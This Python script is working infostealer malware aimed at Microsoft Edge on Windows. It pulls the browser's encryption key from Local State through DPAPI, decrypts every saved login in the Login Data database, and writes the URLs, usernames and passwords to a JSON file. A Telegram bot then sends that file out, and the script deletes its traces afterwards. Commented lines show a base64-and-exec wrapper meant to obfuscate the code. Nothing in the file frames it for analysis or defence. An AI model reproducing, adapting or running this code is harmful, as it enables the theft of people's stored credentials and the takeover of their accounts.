import os, sqlite3, win32crypt
import shutil
import json
import telebot
from Crypto.Cipher import AES
import base64


# code = base64.b64encode(b"""
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Microsoft", "Edge",
                                    "User Data", "Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


def send_data(json_name):
    bot = telebot.TeleBot('%token%')
    bot.send_document('%chat_id%', open(json_name, "rb"))


def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Microsoft", "Edge", "User Data", "Default", "Login Data")
    filename = "temp"
    json_data = {}
    json_data['cookies'] = []
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        if username or password:
            json_data['cookies'].append(
                {
                    "Origin URL": origin_url,
                    "Action URL": action_url,
                    "Username": username,
                    "Password": password
                }
            )
        else:
            continue

    json_name = 'data.json'
    with open(json_name, 'w') as outfile:
        json.dump(json_data, outfile, indent=4)

    send_data(json_name)

    cursor.close()
    db.close()
    try:
        os.remove(json_name)
        os.remove(filename)
    except:
        pass


if __name__ == "__main__":
    main()
#
# # """)
# exec(base64.b64decode(code))